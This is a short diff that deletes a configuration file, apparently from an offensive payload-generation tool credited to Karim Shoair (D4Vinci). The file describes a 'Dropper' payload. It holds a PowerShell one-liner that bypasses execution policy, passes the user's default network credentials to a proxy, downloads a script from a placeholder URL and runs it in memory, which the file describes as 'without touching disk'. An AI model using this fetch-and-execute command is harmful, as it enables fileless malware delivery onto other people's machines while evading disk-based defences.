@@ -1,7 +1,0 @@
-[Info]
-Author      = Karim shoair (D4Vinci)
-Description = Uses powershell to execute your ps1 script on the fly without touching disk.
-
-[Payload]
-Type     = Dropper
-Payload  = powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{}')|iex"
